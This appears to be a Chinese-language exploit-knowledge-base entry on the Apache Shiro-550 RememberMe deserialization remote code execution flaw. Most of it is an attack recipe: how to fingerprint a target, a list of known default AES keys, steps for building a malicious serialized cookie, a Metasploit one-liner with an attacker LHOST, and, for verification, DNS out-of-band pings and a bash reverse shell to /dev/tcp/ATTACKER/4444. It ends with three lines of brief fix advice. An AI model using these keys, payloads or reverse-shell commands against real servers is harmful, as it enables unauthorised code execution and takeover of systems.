---
id: Shiro-550
title: Apache Shiro RememberMe 反序列化 RCE
product: shiro
vendor: Apache
version_affected: "<1.2.5"
severity: CRITICAL
tags: [rce, deserialization, rememberme, 无需认证]
fingerprint: ["rememberMe", "deleteMe", "shiro"]
---

## 漏洞描述

Apache Shiro 1.2.5 之前版本使用硬编码的 AES 密钥（`kPH+bIxk5D2deZiIxcaaaA==`）加密 RememberMe Cookie。攻击者可以构造恶意序列化对象，用该默认密钥加密后放入 Cookie，服务端反序列化时触发任意代码执行。

## 影响版本

- Apache Shiro < 1.2.5（使用默认密钥）
- 实际上很多 Shiro >= 1.2.5 也受影响（开发者自定义了弱密钥）

## 前置条件

- 目标使用 Apache Shiro
- 使用了默认密钥或已知弱密钥

## 利用步骤

1. 确认目标使用 Shiro（Set-Cookie 含 `rememberMe=deleteMe`）
2. 用已知密钥列表尝试（常见密钥约 100+ 个）
3. 选择可用的利用链（CommonsCollections、CommonsBeanutils 等）
4. 生成恶意序列化 payload → AES 加密 → Base64 → 放入 Cookie

## Payload

```bash
# 检测密钥（使用 Shiro 利用工具）
# 常见默认密钥列表:
# kPH+bIxk5D2deZiIxcaaaA==
# 2AvVhdsgUs0FSA3SDFAdag==
# 3AvVhmFLUs0KTA3Kprsdag==
# wGiHplamyXlVB11UXWol8g==
# 4AvVhmFLUs0KTA3Kprsdag==

# 手动构造 Cookie
import base64
from Crypto.Cipher import AES
# 1. 生成 ysoserial payload
# 2. AES-CBC 加密 (key=默认密钥, iv=随机16字节)
# 3. iv + encrypted → Base64
# 4. 放入 Cookie: rememberMe=<base64_payload>
```

```http
GET / HTTP/1.1
Host: target.com
Cookie: rememberMe=<恶意序列化Base64>
```



Metasploit 利用（RememberMe 反序列化 (需要正确的密钥)）:
```bash
msfconsole -q -x "use exploit/multi/http/shiro_rememberme_v124_deserialize; set RHOSTS target; set RPORT 8080; set LHOST attacker_ip; run"
```

## 验证方法

- DNS 外带: payload 中执行 `ping xxx.dnslog.cn`，检查 DNS 记录
- 延时检测: payload 执行 `Thread.sleep(5000)`，观察响应延迟
- 反弹 Shell: `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`

## 常见密钥字典

工具推荐: ShiroExploit、shiro_attack、ShiroScan

## 修复建议

1. 升级 Shiro 至最新版
2. 自定义强随机密钥（不使用默认值）
3. 禁用 RememberMe 功能
